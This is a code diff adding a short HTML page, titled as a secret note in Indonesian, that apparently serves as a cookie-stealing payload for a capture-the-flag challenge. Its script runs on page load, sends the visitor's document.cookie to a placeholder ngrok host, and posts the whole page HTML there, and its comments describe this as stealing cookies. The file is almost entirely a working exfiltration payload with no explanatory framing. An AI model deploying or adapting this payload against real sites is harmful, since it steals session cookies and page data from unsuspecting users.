@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Catatan Penting</title>
+</head>
+
+<body>
+    <h1>Catatan Rahasia</h1>
+    <script>
+        // Script untuk mencuri cookie dan kirim ke server kita
+        fetch('https://your-subdomain.ngrok.io/steal?cookie=' + document.cookie)
+            .catch(error => console.error('Error:', error));
+
+        // Kirim seluruh HTML halaman (jika ada flag di dalamnya)
+        fetch('https://your-subdomain.ngrok.io/html', {
+            method: 'POST',
+            body: document.documentElement.outerHTML
+        }).catch(error => console.error('Error:', error));
+    </script>
+</body>
+
+</html>
